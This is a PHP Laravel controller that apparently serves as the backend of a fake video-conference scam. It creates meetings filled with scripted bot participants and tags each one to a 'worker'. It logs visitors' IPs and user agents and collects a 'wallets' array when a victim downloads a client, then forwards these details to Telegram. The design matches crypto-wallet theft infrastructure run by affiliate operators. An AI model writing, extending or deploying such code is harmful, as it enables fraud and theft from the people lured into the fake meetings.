<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Conference;
use App\Models\Message;
use App\Models\Visit;
use App\Models\Download;
use App\Services\TelegramService;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use App\Models\Worker;
class ConferenceController extends Controller
{
    public function getWorkerTag($conferenceId)
    {
        $conference = Conference::findOrFail($conferenceId);

        return response()->json([
            'tag' => $conference->worker_tag
        ]);
    }

    public function recordVisit($conferenceId)
    {
        $conference = Conference::findOrFail($conferenceId);

        Visit::create([
            'type' => 'conference',
            'reference_id' => $conferenceId,
            'ip_address' => request()->ip(),
            'user_agent' => request()->userAgent()
        ]);

        // Отправляем уведомление в Telegram
        $telegram = new TelegramService();
        $telegram->notifyPageVisit(
            'conference',
            $conference->invite_code,
            request()->ip(),
            request()->userAgent()
        );

        return response()->json([
            'success' => true,
            'message' => 'Visit recorded'
        ]);
    }

    public function getMessages($conferenceId)
    {
        $messages = Message::where('conference_id', $conferenceId)
            ->orderBy('created_at', 'asc')
            ->get();

        return response()->json([
            'data' => $messages->map(function ($message) {
                return [
                    'id' => $message->id,
                    'sender' => $message->sender,
                    'text' => $message->text,
                    'created_at' => $message->created_at->toISOString()
                ];
            })
        ]);
    }

    public function recordDownload($conferenceId)
    {
        $conference = Conference::findOrFail($conferenceId);

        Download::create([
            'type' => 'conference',
            'reference_id' => $conferenceId,
            'platform' => request()->input('platform', 'unknown'),
            'tag' => request()->input('tag'),
            'user_agent' => request()->userAgent(),
            'wallets' => request()->input('wallets', []),
            'ip_address' => request()->ip()
        ]);

        // Отправляем уведомление в Telegram
        $telegram = new TelegramService();
        $telegram->notifyDownload(
            'conference',
            $conference->invite_code,
            request()->input('platform', 'unknown'),
            request()->ip(),
            request()->userAgent(),
            request()->input('wallets', [])
        );

        return response()->json([
            'success' => true,
            'message' => 'Download recorded'
        ]);
    }

    public function join($inviteCode)
    {
        $conference = Conference::where('invite_code', $inviteCode)
            ->where('is_active', true)
            ->firstOrFail();

        // Отправляем уведомление о входе в звонок
        $telegram = new TelegramService();
        $telegram->notifyConferenceJoin(
            $conference->title,
            $inviteCode,
            request()->ip(),
            request()->userAgent()
        );

        $bots = $conference->bots()->get()->map(function ($bot) {
            return [
                'id' => $bot->id,
                'name' => $bot->name,
                'avatar' => $bot->avatar,
                'mic' => $bot->mic,
                'hand' => $bot->hand,
                'avatar_url' => $bot->avatar_url
            ];
        });

        $guests = []; // В реальном приложении здесь будут гости

        return response()->json([
            'conference' => [
                'id' => $conference->id,
                'created_at' => $conference->created_at->toISOString(),
                'bots' => $bots,
                'guests' => $guests
            ]
        ]);
    }

    public function joinWithName(Request $request, $inviteCode)
    {
        $request->validate([
            'name' => 'required|string|max:255'
        ]);

        $conference = Conference::where('invite_code', $inviteCode)
            ->where('is_active', true)
            ->firstOrFail();

        // Отправляем уведомление о входе в звонок с именем
        $telegram = new TelegramService();
        $telegram->notifyConferenceJoin(
            $conference->title . " (Пользователь: " . $request->name . ")",
            $inviteCode,
            request()->ip(),
            request()->userAgent()
        );

        return response()->json([
            'conferenceId' => $conference->id
        ]);
    }

    public function index()
    {
        $conferences = Conference::where('is_active', true)->get();

        return response()->json([
            'conferences' => $conferences->map(function ($conference) {
                return [
                    'id' => $conference->id,
                    'title' => $conference->title,
                    'invite_code' => $conference->invite_code,
                    'worker_tag' => $conference->worker_tag,
                    'created_at' => $conference->created_at->toISOString()
                ];
            })
        ]);
    }

    public function store(Request $request)
    {
        $request->validate([
            'title' => 'required|string|max:255',
            'domain' => 'nullable|string|max:255',
            'ref' => 'nullable|string|max:255'
        ]);
        $token = $request->bearerToken();
        $worker = Worker::where('tag', $token)
            ->where('is_active', true)
            ->first();
        $conference = Conference::create([
            'title' => $request->title,
            'invite_code' => $this->generateInviteCode(),
            'worker_tag' => $worker->tag,
            'is_active' => true
        ]);

        return response()->json([
            'conference' => [
                'id' => $conference->id,
                'title' => $conference->title,
                'invite_code' => $conference->invite_code,
                'worker_tag' => $conference->worker_tag,
                'created_at' => $conference->created_at->toISOString()
            ]
        ]);
    }

    public function destroy($id)
    {
        $conference = Conference::findOrFail($id);
        $conference->delete();

        return response()->json([
            'success' => true,
            'message' => 'Conference deleted'
        ]);
    }

    public function getMembers($conferenceId)
    {
        $conference = Conference::findOrFail($conferenceId);
        $bots = $conference->bots;

        return response()->json([
            'bots' => $bots->map(function ($bot) {
                return [
                    'id' => $bot->id,
                    'name' => $bot->name,
                    'avatar' => $bot->avatar,
                    'mic' => $bot->mic,
                    'hand' => $bot->hand,
                    'avatar_url' => $bot->avatar_url
                ];
            }),
            'guests' => [] // В реальном приложении здесь будут гости
        ]);
    }

    public function sendMessage(Request $request, $conferenceId)
    {
        $request->validate([
            'sender' => 'required|string|max:255',
            'text' => 'required|string',
            'time' => 'nullable|string'
        ]);

        $message = Message::create([
            'conference_id' => $conferenceId,
            'sender' => $request->sender,
            'text' => $request->text
        ]);

        return response()->json([
            'success' => true,
            'message' => 'Message sent'
        ]);
    }

    private function generateInviteCode()
    {
        return strtoupper(substr(md5(uniqid()), 0, 8));
    }

    private function generateWorkerTag()
    {
        return 'worker_' . strtoupper(substr(md5(uniqid()), 0, 6));
    }
}
